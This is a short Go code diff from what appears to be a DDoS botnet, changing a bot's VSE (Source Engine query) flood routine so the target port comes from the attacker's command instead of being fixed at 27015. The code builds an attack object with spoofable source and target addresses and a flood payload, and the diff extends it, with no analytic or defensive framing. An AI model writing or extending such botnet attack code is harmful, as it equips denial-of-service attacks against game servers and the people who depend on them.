@@ -177,7 +177,7 @@ func (b *Bot) VSE() {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
-			dstPort:      "27015",
+			dstPort:      setCall.CallAttack.dstPort,
 			ddosPayload:  []byte(queryPrefix + vsePayload),
 			attackSwitch: setCall.CallAttack.attackSwitch,
 			reportSwitch: setCall.CallAttack.reportSwitch,
